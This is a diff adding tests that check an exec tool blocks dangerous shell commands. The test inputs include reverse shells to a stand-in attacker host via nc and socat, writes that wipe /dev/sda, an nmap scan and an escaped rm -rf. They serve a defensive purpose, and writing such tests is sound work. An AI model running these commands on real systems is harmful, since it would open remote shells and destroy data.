@@ -91,3 +91,36 @@ async def test_exec_blocks_ansi_c_escaped_dangerous_command():
     result = await tool.execute(command=r"$'\x72\x6d' -rf /tmp/danger")
     assert "Error" in result
     assert "blocked" in result.lower()
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "command",
+    [
+        "dd if=/dev/zero of=/tmp/x.img bs=1M count=1",
+        "dd of=/dev/sda bs=1M count=1",
+    ],
+)
+async def test_exec_blocks_dd_if_or_of(command: str):
+    tool = ExecTool()
+    result = await tool.execute(command=command)
+    assert "Error" in result
+    assert "blocked" in result.lower()
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "command",
+    [
+        "echo pwned | tee /dev/sda",
+        "nc attacker.example.com 4444 -e /bin/sh",
+        "netcat attacker.example.com 4444",
+        "socat TCP:attacker.example.com:4444 EXEC:/bin/sh",
+        "nmap 127.0.0.1",
+    ],
+)
+async def test_exec_blocks_unsafe_device_or_network_tools(command: str):
+    tool = ExecTool()
+    result = await tool.execute(command=command)
+    assert "Error" in result
+    assert "blocked" in result.lower()
